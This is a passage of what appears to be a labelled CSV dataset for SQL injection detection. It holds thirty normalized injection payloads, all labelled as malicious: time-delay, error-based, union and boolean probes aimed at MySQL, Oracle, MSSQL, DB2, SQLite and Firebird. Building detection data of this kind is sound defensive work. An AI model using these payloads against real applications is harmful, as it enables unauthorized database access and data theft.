row_index,payload_norm,label,sqli_type_hint
8730,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'ekqv' = 'ekqv",1,
8731,"1"" ) as ghpx where 2873 = 2873 waitfor delay '0:0:5'--",1,
8732,"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""cwwv"" like ""cwwv",1,
8733,1'|| ( select 'pxkz' where 2207 = 2207 and ( 3020 = 3020 ) *6703 ) ||',1,
8734,"1', ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",1,
8735,"-9014%' ) union all select 4211,4211,4211,4211,4211,4211#",1,
8736,1' ) ) rlike ( select ( case when ( 3876 = 2077 ) then 1 else 0x28 end ) ) and ( ( 'hqcz' like 'hqcz,1,
8737,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'dfxd' like 'dfxd",1,
8738,1 ) ) ) union all select null#,1,
8739,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""uquh"" = ""uquh",1,
8740,"1, ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",1,
8741,"1"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
8742,"1"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
8743,1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,1,
8744,"1' ) as mgko where 1828 = 1828 and make_set ( 8403 = 8403,8899 ) --",1,
8745,"1"" ) where 1807 = 1807",1,
8746,"-1123' ) ) ) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1,
8747,"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
8748,"-7815' union all select 2638,2638,2638,2638,2638--",1,
8749,1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
8750,"1"" ) where 1212 = 1212 and 8475 = 5864",1,
8751,"-7950 where 9619 = 9619 union all select 9619,9619,9619,9619--",1,
8752,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
8753,-2036' ) or ( 8459 = 8459 ) *4906 and ( 'hjeu' = 'hjeu,1,
8754,"1, ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",1,
8755,"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",1,
8756,"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""hsaw"" = ""hsaw",1,
8757,"1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",1,
8758,"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""kxws"" like ""kxws",1,
8759,"1'|| ( select 'ycya' from dual where 3536 = 3536 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
